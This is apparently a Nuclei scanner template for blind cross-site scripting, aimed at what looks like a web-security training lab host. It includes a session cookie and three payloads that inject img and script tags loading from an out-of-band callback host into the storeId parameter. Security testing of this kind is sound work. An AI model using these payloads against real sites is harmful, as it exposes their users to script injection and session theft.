id: BlindXSS

info:
  name: BlindXSS
  author: katsuro
  severity: unknown
  tags: blindxss

http:
  - raw:
      - |
        GET /product?productId=1&storeId={{payloadStr}} HTTP/2
        Host: 0a31004d04a7ee16833e928c007b009a.web-security-academy.net
        Cookie: session=0LIUXC6ThAthXx6QVLAsfqVairJrTnkI
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: cross-site
        Te: trailers

    payloads:
      payloadStr:
        - '"></select><img src="{{interactsh-url}}">'
        - '<script src="{{interactsh-url}}"></script>'
        - '"><script src="{{interactsh-url}}"></script>'

    stop-at-first-match: true

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
